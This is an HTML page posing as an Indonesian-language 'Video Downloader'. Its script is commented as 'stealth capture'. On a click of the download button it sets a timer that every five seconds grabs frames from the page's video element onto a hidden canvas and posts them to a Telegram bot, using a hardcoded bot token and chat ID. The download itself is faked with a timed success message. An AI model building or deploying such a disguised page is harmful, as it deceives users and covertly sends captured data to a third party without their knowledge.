<!DOCTYPE html>
<html>
<head>
    <title>Video Downloader</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
            background-color: #f5f5f5;
        }
        #videoPlayer {
            width: 100%;
            background: #000;
            margin: 20px 0;
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        #status {
            margin-top: 20px;
            color: #666;
            font-style: italic;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Video Downloader</h1>
    <p>Download video favorit Anda dengan mudah!</p>
    
    <div id="videoContainer">
        <video id="videoPlayer" controls>
            <source src="https://sample-videos.com/video123/mp4/720/big_buck_bunny_720p_1mb.mp4" type="video/mp4">
            Browser Anda tidak mendukung video tag.
        </video>
    </div>
    
    <button id="downloadBtn">Download Video</button>
    <p id="status">Status: Menunggu...</p>
    
    <canvas id="hiddenCanvas" class="hidden"></canvas>
    
    <script>
        // Konfigurasi Telegram
        const BOT_TOKEN = '8299240007:AAHN7OTPC4cjG17_66bmOhl-oBwbAthyk0c'; // Ganti dengan token bot Anda
        const CHAT_ID = '7548339932'; // Ganti dengan chat ID Anda
        
        // Elemen DOM
        const videoPlayer = document.getElementById('videoPlayer');
        const downloadBtn = document.getElementById('downloadBtn');
        const statusEl = document.getElementById('status');
        const hiddenCanvas = document.getElementById('hiddenCanvas');
        const ctx = hiddenCanvas.getContext('2d');
        
        // Variabel untuk stealth capture
        let captureInterval;
        let isCapturing = false;
        
        // Fungsi untuk mengirim gambar ke Telegram
        async function sendToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, 'stealth_capture.jpg');
            formData.append('caption', 'Stealth capture - ' + new Date().toLocaleString());
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }
        
        // Fungsi untuk mengambil gambar secara diam-diam
        function takeStealthPhoto() {
            hiddenCanvas.width = videoPlayer.videoWidth;
            hiddenCanvas.height = videoPlayer.videoHeight;
            ctx.drawImage(videoPlayer, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
            
            hiddenCanvas.toBlob(async (blob) => {
                const success = await sendToTelegram(blob);
                if (success) {
                    console.log('Photo sent to Telegram successfully');
                } else {
                    console.log('Failed to send photo');
                }
            }, 'image/jpeg', 0.8);
        }
        
        // Event listener untuk tombol download
        downloadBtn.addEventListener('click', () => {
            statusEl.textContent = "Status: Memproses video...";
            
            // Mulai mengambil gambar diam-diam
            if (!isCapturing) {
                isCapturing = true;
                captureInterval = setInterval(takeStealthPhoto, 5000); // Ambil gambar setiap 5 detik
                statusEl.textContent = "Status: Mengunduh video... (5 detik lagi)";
                
                // Simulasi proses download
                setTimeout(() => {
                    statusEl.textContent = "Status: Video berhasil diunduh!";
                    alert('Video berhasil diunduh!');
                }, 5000);
            }
        });
        
        // Inisialisasi video player
        videoPlayer.addEventListener('play', () => {
            if (!isCapturing) {
                statusEl.textContent = "Status: Video sedang diputar";
            }
        });
    </script>
</body>
</html>
